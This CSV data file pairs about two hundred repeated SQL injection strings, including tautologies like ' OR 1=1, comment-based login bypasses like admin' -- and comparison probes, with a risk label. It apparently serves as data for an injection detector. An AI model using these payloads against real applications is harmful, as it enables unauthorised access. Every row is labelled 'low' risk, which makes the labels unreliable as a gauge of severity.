query,risk
' >= 1,low
' OR 'x'='x,low
' = 1,low
""" = 1",low
1' OR '1'='1,low
admin' --,low
' = 1,low
' || 1=1 --,low
' >= 1,low
1' OR '1'='1,low
' OR 'a'='a,low
OR 1=1,low
' <> 1,low
' OR 1=1,low
' OR 1=1,low
' = 1,low
1' OR '1'='1,low
' OR 1=1,low
OR 1=1,low
' <= 1,low
' OR 1=1,low
' OR 1=1,low
' || 1=1 --,low
OR 1=1,low
1' OR '1'='1,low
""" OR ""1""=""1",low
' OR 'x'='x,low
' = 1,low
' >= 1,low
""" OR ""1""=""1",low
' OR 1=1,low
' OR 1=1,low
' OR 1=1,low
' >= 1,low
' <> 1,low
' OR 'a'='a,low
' OR 1=1,low
' >= 1,low
OR 1=1,low
' = 1,low
""" = 1",low
' <= 1,low
OR 1=1,low
' || 1=1 --,low
' OR 'x'='x,low
' = 1,low
' OR 1=1,low
' = 1,low
' <= 1,low
' = 1,low
' = 1,low
' OR 1=1,low
admin' --,low
' OR 1=1 --,low
' OR 1=1,low
' <> 1,low
' = 1,low
' = 1,low
' = 1,low
' <= 1,low
' <> 1,low
' <> 1,low
' OR 1=1,low
' <= 1,low
""" = 1",low
' OR 1=1,low
' = 1,low
' OR 1=1,low
""" = 1",low
1' OR '1'='1,low
1' OR '1'='1,low
' OR 'x'='x,low
' <= 1,low
' = 1,low
' >= 1,low
' OR 1=1,low
' = 1,low
' >= 1,low
' = 1,low
' <> 1,low
""" OR ""1""=""1",low
' = 1,low
' = 1,low
' = 1,low
' >= 1,low
' <> 1,low
' = 1,low
' = 1,low
' >= 1,low
""" OR ""1""=""1",low
""" = 1",low
""" OR ""1""=""1",low
""" = 1",low
' <> 1,low
' <> 1,low
' OR 'x'='x,low
""" = 1",low
""" OR ""1""=""1",low
""" = 1",low
admin' --,low
' = 1,low
' <> 1,low
OR 1=1,low
' = 1,low
' >= 1,low
' = 1,low
' = 1,low
""" OR ""1""=""1",low
""" OR ""1""=""1",low
' <> 1,low
OR 1=1,low
' <= 1,low
' <> 1,low
' = 1,low
""" OR ""1""=""1",low
' <= 1,low
""" = 1",low
' <= 1,low
' = 1,low
' <= 1,low
' <> 1,low
""" = 1",low
OR 1=1,low
' <> 1,low
' = 1,low
' = 1,low
' = 1,low
' OR 1=1,low
' = 1,low
1' OR '1'='1,low
""" = 1",low
' OR 'x'='x,low
' OR 1=1,low
OR 1=1,low
""" = 1",low
' >= 1,low
' = 1,low
' = 1,low
' = 1,low
' OR 1=1,low
' = 1,low
' <= 1,low
' OR 'x'='x,low
' OR 'a'='a,low
' = 1,low
' OR 'a'='a,low
""" OR ""1""=""1",low
""" OR ""1""=""1",low
OR 1=1,low
' = 1,low
' = 1,low
' <= 1,low
' = 1,low
""" = 1",low
' <= 1,low
' = 1,low
""" OR ""1""=""1",low
""" = 1",low
' <> 1,low
' <= 1,low
' OR 1=1,low
' = 1,low
' <= 1,low
""" OR ""1""=""1",low
OR 1=1,low
' = 1,low
' OR 'x'='x,low
' OR 1=1,low
OR 1=1,low
1' OR '1'='1,low
""" = 1",low
""" = 1",low
' <> 1,low
' <= 1,low
' >= 1,low
""" OR ""1""=""1",low
""" = 1",low
' || 1=1 --,low
' <= 1,low
' = 1,low
' OR 1=1 --,low
' = 1,low
' <= 1,low
' OR 1=1,low
' OR 1=1 --,low
' <= 1,low
""" OR ""1""=""1",low
' <> 1,low
admin' --,low
